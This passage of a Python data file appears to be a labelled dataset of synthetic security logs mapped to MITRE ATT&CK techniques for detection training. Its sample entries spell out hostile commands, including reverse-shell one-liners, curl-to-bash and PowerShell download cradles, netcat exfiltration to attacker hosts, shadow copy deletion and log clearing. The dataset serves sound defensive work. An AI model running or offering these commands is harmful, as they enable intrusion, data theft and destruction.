        ("2024-02-10T13:40:00Z WORKSTATION105 Sysmon EventID=1: Process Create. process=C:\\Tools\\paexec.exe cmdline=paexec \\\\SERVER12 -u CORP\\admin -p pwd cmd /c whoami user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1021.002", "high", "paexec (psexec clone) invoking remote cmd - SMB lateral movement LOLBin."),
    ]),
    # T1033 System Owner/User Discovery (currently 5) -> +15
    ("T1033", [
        (f"{i}: Feb 10 14:{i:02d}:00 host{40+i} audit: type=EXECVE pid={8000+i} uid=33 cmdline=whoami", "Linux", "AuditD", "Malicious", "T1033", "high", f"whoami executed by low-priv user - user-context probing (sample {i}).")
        for i in range(1, 16)
    ]),
    # T1040 Network Sniffing (currently 5) -> +15
    ("T1040", [
        ("Feb 10 15:00:00 sensor03 audit: type=EXECVE pid=9001 uid=0 cmdline=tcpdump -i eth1 -s 0 -w /tmp/c.pcap", "Linux", "AuditD", "Malicious", "T1040", "high", "Full-size tcpdump capture to /tmp - large-scale traffic collection."),
        ("Feb 10 15:05:00 sensor04 audit: type=EXECVE pid=9010 uid=0 cmdline=tshark -i eth0 -Y 'http'", "Linux", "AuditD", "Malicious", "T1040", "high", "tshark live-capture HTTP-only display filter - credential-harvesting."),
        ("Feb 10 15:10:00 sensor05 audit: type=EXECVE pid=9020 uid=0 cmdline=ngrep -q -d eth0 'password'", "Linux", "AuditD", "Malicious", "T1040", "high", "ngrep searching live traffic for 'password' string."),
        ("Feb 10 15:15:00 sensor06 audit: type=EXECVE pid=9030 uid=0 cmdline=ettercap -T -M arp:remote /10.0.0.0/24//", "Linux", "AuditD", "Malicious", "T1040", "high", "ettercap text-mode with ARP MitM - credential sniffing with ARP poisoning."),
        ("Feb 10 15:20:00 sensor07 audit: type=EXECVE pid=9040 uid=0 cmdline=tcpdump -i any port 80 or port 21", "Linux", "AuditD", "Malicious", "T1040", "high", "tcpdump filtered for cleartext HTTP/FTP - credential capture."),
        ("2024-02-10T15:25:00Z WORKSTATION110 Sysmon EventID=1: Process Create. process=C:\\Tools\\Wireshark\\Wireshark.exe user=CORP\\attacker", "Windows", "Sysmon", "Suspicious", "T1040", "medium", "Wireshark GUI launched on a non-admin workstation."),
        ("2024-02-10T15:30:00Z WORKSTATION111 Sysmon EventID=1: Process Create. process=C:\\Tools\\Wireshark\\tshark.exe cmdline=tshark -i 1 -f 'tcp port 23' user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1040", "high", "tshark capturing telnet traffic - cleartext credential sniffing."),
        ("Feb 10 15:35:00 sensor08 audit: type=EXECVE pid=9050 uid=0 cmdline=tcpdump -i eth0 -w /tmp/rdp.pcap port 3389", "Linux", "AuditD", "Malicious", "T1040", "high", "Targeted RDP capture - credential harvesting for remote access."),
        ("Feb 10 15:40:00 sensor09 audit: type=EXECVE pid=9060 uid=0 cmdline=dumpcap -i eth0 -b filesize:102400", "Linux", "AuditD", "Malicious", "T1040", "high", "dumpcap rotating large captures - long-running collection."),
        ("Feb 10 15:45:00 sensor10 audit: type=EXECVE pid=9070 uid=0 cmdline=tcpdump -i eth0 -c 10000 -w /var/tmp/big.pcap", "Linux", "AuditD", "Malicious", "T1040", "high", "10k packet capture stored under /var/tmp - evidence of bulk sniffing."),
        ("2024-02-10T15:50:00Z WORKSTATION112 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\pktmon.exe cmdline=pktmon start --capture user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1040", "high", "pktmon (built-in Windows packet sniffer) start - LOLBin network capture."),
        ("Feb 10 15:55:00 sensor11 audit: type=EXECVE pid=9080 uid=0 cmdline=tshark -i eth0 -V -T json > /tmp/capture.json", "Linux", "AuditD", "Malicious", "T1040", "high", "tshark verbose JSON dump - structured capture for later parsing."),
        ("Feb 10 16:00:00 sensor12 audit: type=EXECVE pid=9090 uid=0 cmdline=tcpdump -i eth0 -w - | nc attacker.example.com 9000", "Linux", "AuditD", "Malicious", "T1040", "high", "tcpdump piped to netcat to attacker host - live-stream exfil of packets."),
        ("Feb 10 16:05:00 sensor13 audit: type=EXECVE pid=9100 uid=0 cmdline=tshark -i eth0 -f 'host 10.0.9.10 and port 445'", "Linux", "AuditD", "Malicious", "T1040", "high", "tshark focused capture against a DC's SMB - targeted harvesting."),
        ("Feb 10 16:10:00 sensor14 audit: type=EXECVE pid=9110 uid=0 cmdline=tcpdump -i eth0 src 10.0.9.10 -w /tmp/dc.pcap", "Linux", "AuditD", "Malicious", "T1040", "high", "tcpdump filtered on DC source IP - credential sniffing."),
    ]),
    # T1041 Exfil over C2 (currently 5) -> +15
    ("T1041", [
        ("date=2024-02-10 time=16:15:00 devname=FG-EDGE-01 type=traffic srcip=10.0.3.80 dstip=198.51.100.90 dstport=443 action=accept sentbyte=104857600 rcvdbyte=1024 proto=6 duration=180 service=HTTPS", "Firewall", "Fortinet KV", "Malicious", "T1041", "high", "100 MB outbound HTTPS with 1 KB inbound - clear exfil."),
        ("date=2024-02-10 time=16:20:00 devname=FG-EDGE-01 type=traffic srcip=10.0.3.81 dstip=203.0.113.91 dstport=443 action=accept sentbyte=209715200 rcvdbyte=2048 proto=6 duration=420 service=HTTPS", "Firewall", "Fortinet KV", "Malicious", "T1041", "high", "200 MB HTTPS upload to unknown external IP - large C2 exfil."),
        ("{\"@timestamp\":\"2024-02-10T16:25:00Z\",\"id.orig_h\":\"10.0.3.82\",\"id.resp_h\":\"203.0.113.92\",\"id.resp_p\":443,\"proto\":\"tcp\",\"service\":\"ssl\",\"duration\":600,\"orig_bytes\":314572800,\"resp_bytes\":4096,\"conn_state\":\"SF\"}", "IDS", "Zeek JSON", "Malicious", "T1041", "high", "300 MB TLS session with 4 KB inbound - long-running C2 exfil."),
        ("2024-02-10T16:30:00Z PROXY01 proxy: user=svc_etl POST https://cdn-drop.example/upload sent=83886080 received=128 status=200", "Network", "Proxy", "Malicious", "T1041", "high", "ETL service account uploading 80 MB to unknown CDN drop - exfil."),
        ("date=2024-02-10 time=16:35:00 devname=FG-EDGE-01 type=traffic srcip=10.0.3.83 dstip=198.51.100.93 dstport=80 action=accept sentbyte=52428800 rcvdbyte=512 proto=6 duration=90 service=HTTP", "Firewall", "Fortinet KV", "Malicious", "T1041", "high", "50 MB over cleartext HTTP - exfil over C2."),
        ("{\"@timestamp\":\"2024-02-10T16:40:00Z\",\"id.orig_h\":\"10.0.3.84\",\"id.resp_h\":\"198.51.100.94\",\"id.resp_p\":8443,\"proto\":\"tcp\",\"service\":\"ssl\",\"duration\":250,\"orig_bytes\":78643200,\"resp_bytes\":1024,\"conn_state\":\"SF\"}", "IDS", "Zeek JSON", "Malicious", "T1041", "high", "75 MB TLS on non-standard 8443 port to unknown IP - exfil."),
        ("2024-02-10T16:45:00Z PROXY01 proxy: user=attacker POST https://storage.unknown.tld/bulk sent=62914560 received=256 status=201", "Network", "Proxy", "Malicious", "T1041", "high", "60 MB HTTPS upload to unknown storage service - exfil."),
        ("date=2024-02-10 time=16:50:00 devname=FG-EDGE-01 type=traffic srcip=10.0.3.85 dstip=203.0.113.95 dstport=443 action=accept sentbyte=41943040 rcvdbyte=2048 proto=6 duration=120 service=HTTPS", "Firewall", "Fortinet KV", "Malicious", "T1041", "high", "40 MB HTTPS out - persistent C2 exfil window."),
        ("{\"@timestamp\":\"2024-02-10T16:55:00Z\",\"id.orig_h\":\"10.0.3.86\",\"id.resp_h\":\"198.51.100.96\",\"id.resp_p\":443,\"proto\":\"tcp\",\"service\":\"ssl\",\"duration\":900,\"orig_bytes\":419430400,\"resp_bytes\":8192,\"conn_state\":\"SF\"}", "IDS", "Zeek JSON", "Malicious", "T1041", "high", "400 MB over 15 min - massive C2 exfiltration."),
        ("2024-02-10T17:00:00Z PROXY01 proxy: user=svc_app POST https://drop.example.net/data sent=94371840 received=256 status=200", "Network", "Proxy", "Malicious", "T1041", "high", "90 MB upload to external unknown drop by service account."),
        ("date=2024-02-10 time=17:05:00 devname=FG-EDGE-01 type=traffic srcip=10.0.3.87 dstip=203.0.113.97 dstport=443 action=accept sentbyte=31457280 rcvdbyte=1024 proto=6 duration=80 service=HTTPS", "Firewall", "Fortinet KV", "Malicious", "T1041", "high", "30 MB HTTPS out - staged exfil."),
        ("{\"@timestamp\":\"2024-02-10T17:10:00Z\",\"id.orig_h\":\"10.0.3.88\",\"id.resp_h\":\"198.51.100.98\",\"id.resp_p\":443,\"proto\":\"tcp\",\"service\":\"ssl\",\"duration\":300,\"orig_bytes\":157286400,\"resp_bytes\":512,\"conn_state\":\"SF\"}", "IDS", "Zeek JSON", "Malicious", "T1041", "high", "150 MB in 5 minutes - clear asymmetric exfil."),
        ("2024-02-10T17:15:00Z PROXY01 proxy: user=unknown PUT https://rogue-storage.example/blob sent=73400320 received=512 status=200", "Network", "Proxy", "Malicious", "T1041", "high", "70 MB PUT upload to external unknown storage - exfil."),
        ("date=2024-02-10 time=17:20:00 devname=FG-EDGE-01 type=traffic srcip=10.0.3.89 dstip=203.0.113.99 dstport=443 action=accept sentbyte=25165824 rcvdbyte=1024 proto=6 duration=60 service=HTTPS", "Firewall", "Fortinet KV", "Malicious", "T1041", "high", "24 MB HTTPS out - short-burst exfil."),
        ("2024-02-10T17:25:00Z PROXY01 proxy: user=svc_backup POST https://attacker-drop.example.com/data sent=52428800 received=128 status=200", "Network", "Proxy", "Malicious", "T1041", "high", "50 MB POST to attacker-controlled drop - exfil via backup svc account."),
    ]),
    # T1047 WMI (currently 5) -> +15
    ("T1047", [
        ("2024-02-10T17:30:00Z WORKSTATION120 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic /node:SERVER20 process call create 'powershell.exe -nop -c whoami' user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "WMIC /node remote PowerShell exec."),
        ("2024-02-10T17:35:00Z WORKSTATION121 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-WmiObject -Class Win32_Process -ComputerName SERVER21 user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "Remote Get-WmiObject Win32_Process enumeration."),
        ("2024-02-10T17:40:00Z WORKSTATION122 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Invoke-WmiMethod -Path Win32_Process -Name Create -ArgumentList 'cmd /c whoami' -ComputerName SERVER22 user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "Invoke-WmiMethod remote Win32_Process create."),
        ("2024-02-10T17:45:00Z WORKSTATION123 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic service where 'name like \"%\"' get name,pathname,startmode user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "WMIC service enumeration - post-exploit discovery via WMI."),
        ("2024-02-10T17:50:00Z WORKSTATION124 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic useraccount get name,sid user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "WMIC useraccount discovery."),
        ("2024-02-10T17:55:00Z WORKSTATION125 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic startup list full user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "wmic startup list - persistence enumeration via WMI."),
        ("2024-02-10T18:00:00Z WORKSTATION126 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-CimInstance -ClassName Win32_Service -ComputerName SERVER25 user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "Get-CimInstance remote service enumeration."),
        ("2024-02-10T18:05:00Z WORKSTATION127 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic /node:SERVER26 product get name,version user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "Remote installed software enumeration via WMI."),
        ("2024-02-10T18:10:00Z WORKSTATION128 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic /node:SERVER27 os get caption,version,csname user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "Remote OS enumeration via WMI."),
        ("2024-02-10T18:15:00Z WORKSTATION129 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic qfe list full user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "WMIC qfe list - hotfix enumeration via WMI."),
        ("2024-02-10T18:20:00Z WORKSTATION130 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=([wmiclass]'\\\\SERVER28\\root\\cimv2:Win32_Process').Create('calc.exe') user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "Raw WMI class path remote Create() - PowerShell + WMI lateral exec."),
        ("2024-02-10T18:25:00Z WORKSTATION131 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic /node:SERVER29 nicconfig get ipaddress,description user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "Remote network-configuration enumeration via WMI."),
        ("2024-02-10T18:30:00Z WORKSTATION132 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Register-WmiEvent -Query \"SELECT * FROM Win32_ProcessStartTrace\" -Action { } user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "WMI event subscription registration - WMI persistence."),
        ("2024-02-10T18:35:00Z WORKSTATION133 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic /node:@nodes.txt process call create 'net user evilsvc Pass1 /add' user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "WMIC mass-deploy remote command via node list file - batch lateral exec."),
        ("2024-02-10T18:40:00Z WORKSTATION134 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic shadowcopy delete user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1047", "high", "wmic shadowcopy delete - WMI abused for recovery inhibition."),
    ]),
    # T1048 Exfil Alt Protocol (currently 5) -> +15
    ("T1048", [
        (f"Feb 11 08:{i:02d}:00 jump{10+i} audit: type=EXECVE pid={10000+i} uid=1000 cmdline=scp -r /data/docs evil{i}@{192+i}.0.2.{i+1}:/staging/", "Linux", "AuditD", "Malicious", "T1048.001", "high", f"scp of /data/docs to external attacker host (sample {i+1}).")
        for i in range(15)
    ]),
    # T1053 Scheduled Task (currently 5) -> +15
    ("T1053", [
        ("2024-02-11T09:00:00Z WORKSTATION140 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\schtasks.exe cmdline=schtasks /create /tn EvilUpdate /sc ONLOGON /tr \"C:\\Users\\Public\\m.exe\" /rl HIGHEST user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1053.005", "high", "schtasks creating ONLOGON HIGHEST-priv task pointing at a Public-path binary - persistence."),
        ("2024-02-11T09:05:00Z WORKSTATION141 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\schtasks.exe cmdline=schtasks /create /tn SysReboot /sc ONSTART /tr \"cmd /c C:\\Temp\\run.bat\" user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1053.005", "high", "ONSTART scheduled task running a .bat from Temp - boot-persistence."),
        ("2024-02-11T09:10:00Z WORKSTATION142 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\at.exe cmdline=at 23:00 C:\\Users\\Public\\backdoor.exe user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1053.002", "high", "Legacy at.exe scheduling a Public-path executable - persistence."),
        ("Feb 11 09:15:00 host50 cron[4100]: (root) CMD (/opt/.hidden/update.sh > /dev/null 2>&1)", "Linux", "Syslog", "Malicious", "T1053.003", "high", "Hidden root cron pointing at a dotfile directory - persistence."),
        ("Feb 11 09:20:00 host51 cron[4110]: (www-data) CMD (curl -s http://198.51.100.50/payload | bash)", "Linux", "Syslog", "Malicious", "T1053.003", "high", "Cron piping curl output to bash - remote-code-execution persistence."),
        ("Feb 11 09:25:00 host52 crontab[4120]: (root) REPLACE (root)", "Linux", "Syslog", "Malicious", "T1053.003", "high", "root crontab replaced - attacker modifying schedule."),
        ("2024-02-11T09:30:00Z WORKSTATION143 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Register-ScheduledTask -TaskName 'UpdateSvc' -Action (New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\u.exe') -Trigger (New-ScheduledTaskTrigger -AtStartup) user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1053.005", "high", "PowerShell Register-ScheduledTask at startup - persistence."),
        ("Feb 11 09:35:00 host53 systemd[1]: Created slice timer.unit.timer", "Linux", "Syslog", "Suspicious", "T1053.006", "medium", "systemd timer unit creation - potential persistence via systemd timer."),
        ("2024-02-11T09:40:00Z WORKSTATION144 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\schtasks.exe cmdline=schtasks /create /tn SysUpd /sc DAILY /st 03:00 /tr \"C:\\Windows\\Temp\\u.exe\" user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1053.005", "high", "Daily 3am scheduled task in Temp - scheduled persistence."),
        ("2024-02-11T09:45:00Z WORKSTATION145 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\schtasks.exe cmdline=schtasks /change /tn ExistingTask /tr \"C:\\Users\\Public\\hijack.exe\" user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1053.005", "high", "Modifying an existing task's action path - persistence hijack."),
        ("Feb 11 09:50:00 host54 audit: type=EXECVE pid=4200 uid=0 cmdline=systemd-run --on-calendar=daily /tmp/.e.sh", "Linux", "AuditD", "Malicious", "T1053.006", "high", "systemd-run with daily calendar trigger on a temp script - persistence."),
        ("2024-02-11T09:55:00Z WORKSTATION146 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\schtasks.exe cmdline=schtasks /create /tn WdPoll /sc MINUTE /mo 10 /tr \"powershell -w hidden -c iex(iwr http://198.51.100.5/p).Content\" user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1053.005", "high", "Every-10-min task invoking hidden PowerShell IEX - beaconing persistence."),
        ("Feb 11 10:00:00 host55 audit: type=EXECVE pid=4210 uid=0 cmdline=echo \"*/5 * * * * /tmp/.beacon.sh\" | crontab -", "Linux", "AuditD", "Malicious", "T1053.003", "high", "Inline crontab install of a 5-min beacon script."),
        ("2024-02-11T10:05:00Z WORKSTATION147 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\schtasks.exe cmdline=schtasks /delete /tn BackupTask /f user=CORP\\attacker", "Windows", "Sysmon", "Suspicious", "T1053.005", "medium", "Force-deleting an existing backup task - possible defense evasion/persistence reset."),
        ("Feb 11 10:10:00 host56 audit: type=EXECVE pid=4220 uid=0 cmdline=cp /tmp/evil.service /etc/systemd/system/ && systemctl enable evil.service", "Linux", "AuditD", "Malicious", "T1053.006", "high", "Installing a systemd unit from /tmp and enabling it - persistence."),
    ]),
    # T1055 Process Injection (currently 5) -> +15
    ("T1055", [
        ("2024-02-11T10:15:00Z WORKSTATION150 Sysmon EventID=8: CreateRemoteThread. SourceImage=C:\\Users\\Public\\l.exe TargetImage=C:\\Windows\\System32\\lsass.exe", "Windows", "Sysmon", "Malicious", "T1055", "high", "CreateRemoteThread into lsass - credential-dumping injection."),
        ("2024-02-11T10:20:00Z WORKSTATION151 Sysmon EventID=10: ProcessAccess. SourceImage=C:\\Users\\Public\\i.exe TargetImage=C:\\Windows\\explorer.exe GrantedAccess=0x1410", "Windows", "Sysmon", "Malicious", "T1055", "high", "VM_WRITE+VM_OPERATION on explorer - injection setup."),
        ("2024-02-11T10:25:00Z WORKSTATION152 Sysmon EventID=8: CreateRemoteThread. SourceImage=C:\\Temp\\payload.exe TargetImage=C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "Windows", "Sysmon", "Malicious", "T1055", "high", "CreateRemoteThread into chrome - browser process hollowing."),
        ("2024-02-11T10:30:00Z WORKSTATION153 Sysmon EventID=10: ProcessAccess. SourceImage=C:\\Windows\\Temp\\r.exe TargetImage=C:\\Windows\\System32\\svchost.exe GrantedAccess=0x1FFFFF", "Windows", "Sysmon", "Malicious", "T1055", "high", "Full-access ProcessAccess on svchost - injection-class behavior."),
        ("Feb 11 10:35:00 host60 audit: type=EXECVE pid=5100 uid=0 cmdline=gdb -p 1234 -batch -ex 'call system(\"/tmp/.s\")'", "Linux", "AuditD", "Malicious", "T1055", "high", "gdb attaching to a live PID and calling system() - Linux process injection."),
        ("2024-02-11T10:40:00Z WORKSTATION154 Sysmon EventID=8: CreateRemoteThread. SourceImage=C:\\Users\\Public\\inj.exe TargetImage=C:\\Windows\\System32\\winlogon.exe", "Windows", "Sysmon", "Malicious", "T1055", "high", "Thread injection into winlogon."),
        ("Feb 11 10:45:00 host61 audit: type=SYSCALL syscall=ptrace pid=5110 uid=0 comm=inject", "Linux", "AuditD", "Malicious", "T1055", "high", "Raw ptrace syscall from a binary named 'inject' - code injection."),
        ("2024-02-11T10:50:00Z WORKSTATION155 Sysmon EventID=7: ImageLoaded. Image=C:\\Users\\Public\\mod.dll ProcessImage=C:\\Windows\\System32\\notepad.exe Signed=false", "Windows", "Sysmon", "Malicious", "T1055", "high", "Unsigned DLL loaded into notepad from a user-writable path - DLL injection."),
        ("2024-02-11T10:55:00Z WORKSTATION156 Sysmon EventID=8: CreateRemoteThread. SourceImage=C:\\Windows\\Temp\\b.exe TargetImage=C:\\Windows\\explorer.exe", "Windows", "Sysmon", "Malicious", "T1055", "high", "Remote thread into explorer from a Temp binary."),
        ("2024-02-11T11:00:00Z WORKSTATION157 Sysmon EventID=10: ProcessAccess. SourceImage=C:\\Windows\\Temp\\c.exe TargetImage=C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE GrantedAccess=0x1F0FFF", "Windows", "Sysmon", "Malicious", "T1055", "high", "Full ProcessAccess on Outlook from Temp - mail-stealer injection."),
        ("Feb 11 11:05:00 host62 audit: type=EXECVE pid=5120 uid=0 cmdline=./so_inject --pid 4444 --library /tmp/.e.so", "Linux", "AuditD", "Malicious", "T1055", "high", "LD_PRELOAD-style injector pushing a shared object into a live PID."),
        ("2024-02-11T11:10:00Z WORKSTATION158 Sysmon EventID=1: Process Create. process=C:\\Users\\Public\\load.exe cmdline=load.exe --inject 2880 C:\\Users\\Public\\p.dll user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1055", "high", "Generic injector tool invoking --inject with PID and DLL - injection."),
        ("2024-02-11T11:15:00Z WORKSTATION159 Sysmon EventID=10: ProcessAccess. SourceImage=C:\\Windows\\Temp\\x.exe TargetImage=C:\\Windows\\System32\\dllhost.exe GrantedAccess=0x1410", "Windows", "Sysmon", "Malicious", "T1055", "high", "VM_WRITE+VM_OPERATION against dllhost - classic injection precursor."),
        ("Feb 11 11:20:00 host63 audit: type=EXECVE pid=5130 uid=0 cmdline=dd if=/tmp/.sc of=/proc/4100/mem bs=1 seek=$((0x401000)) count=256", "Linux", "AuditD", "Malicious", "T1055", "high", "Direct write to /proc/PID/mem - Linux injection via procfs."),
        ("2024-02-11T11:25:00Z WORKSTATION160 Sysmon EventID=8: CreateRemoteThread. SourceImage=C:\\Users\\Public\\dll-drop.exe TargetImage=C:\\Windows\\System32\\spoolsv.exe", "Windows", "Sysmon", "Malicious", "T1055", "high", "Thread injection into spooler service - PrintNightmare-style exploit path."),
    ]),
    # T1057 Process Discovery (currently 5) -> +15
    ("T1057", [
        (f"Feb 11 12:{i:02d}:00 host{70+i} audit: type=EXECVE pid={6000+i} uid=33 cmdline=ps -ef", "Linux", "AuditD", "Malicious", "T1057", "high", f"ps -ef enumeration by web user (sample {i+1}).")
        for i in range(15)
    ]),
    # T1059 Command and Scripting Interpreter (currently 7) -> +13
    ("T1059", [
        ("2024-02-11T13:00:00Z WORKSTATION170 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=powershell -ep bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://198.51.100.10/p.ps1\")' user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1059.001", "high", "PowerShell -ep bypass IEX DownloadString - cradle."),
        ("2024-02-11T13:05:00Z WORKSTATION171 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=powershell.exe -w hidden -nop -c $c=New-Object Net.WebClient;$c.DownloadFile('http://198.51.100.11/r','C:\\Temp\\r.exe');Start-Process C:\\Temp\\r.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1059.001", "high", "Hidden PowerShell DownloadFile + Start-Process - loader chain."),
        ("2024-02-11T13:10:00Z WORKSTATION172 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\cmd.exe cmdline=cmd.exe /c whoami & net user & tasklist user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1059.003", "high", "Chained cmd discovery commands - post-compromise enumeration."),
        ("2024-02-11T13:15:00Z WORKSTATION173 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\cscript.exe cmdline=cscript.exe //nologo C:\\Users\\Public\\l.vbs user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1059.005", "high", "cscript running a VBScript from Public - VBScript interpreter abuse."),
        ("2024-02-11T13:20:00Z WORKSTATION174 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wscript.exe cmdline=wscript.exe C:\\Users\\Public\\dropper.js user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1059.007", "high", "wscript running .js from Public - JScript payload."),
        ("Feb 11 13:25:00 host80 audit: type=EXECVE pid=7000 uid=33 cmdline=bash -c 'curl http://198.51.100.15/s | bash'", "Linux", "AuditD", "Malicious", "T1059.004", "high", "bash -c with curl | bash - remote code execution one-liner."),
        ("Feb 11 13:30:00 host81 audit: type=EXECVE pid=7010 uid=33 cmdline=python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('198.51.100.20',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\"", "Linux", "AuditD", "Malicious", "T1059.006", "high", "Python reverse-shell one-liner."),
        ("Feb 11 13:35:00 host82 audit: type=EXECVE pid=7020 uid=33 cmdline=perl -e 'use Socket;$i=\"198.51.100.21\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)))&&exec \"/bin/sh\"'", "Linux", "AuditD", "Malicious", "T1059", "high", "Perl reverse-shell one-liner."),
        ("2024-02-11T13:40:00Z WORKSTATION175 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1059.001", "high", "PowerShell base64 -enc DownloadString - obfuscated cradle."),
        ("2024-02-11T13:45:00Z WORKSTATION176 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=powershell -ExecutionPolicy Bypass -File C:\\Temp\\installer.ps1 user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1059.001", "high", "PowerShell bypassing execution policy to run a Temp script."),
        ("Feb 11 13:50:00 host83 audit: type=EXECVE pid=7030 uid=33 cmdline=sh -c 'wget http://198.51.100.22/p.sh -O /tmp/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh'", "Linux", "AuditD", "Malicious", "T1059.004", "high", "Multistage sh -c wget+chmod+run - staged shell execution."),
        ("Feb 11 13:55:00 host84 audit: type=EXECVE pid=7040 uid=33 cmdline=ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"198.51.100.23\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", "Linux", "AuditD", "Malicious", "T1059", "high", "Ruby fork/TCPSocket reverse shell."),
        ("2024-02-11T14:00:00Z WORKSTATION177 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\cmd.exe cmdline=cmd.exe /v:on /c \"set x=calc&& !x!.exe\" user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1059.003", "high", "cmd delayed-expansion obfuscation - interpreter abuse with evasion."),
    ]),
    # T1070 Indicator Removal (currently 5) -> +15
    ("T1070", [
        ("2024-02-11T14:05:00Z WORKSTATION180 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wevtutil.exe cmdline=wevtutil cl System user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1070.001", "high", "Clearing the System event log - tamper."),
        ("2024-02-11T14:10:00Z WORKSTATION181 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wevtutil.exe cmdline=wevtutil cl Application user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1070.001", "high", "Clearing the Application event log."),
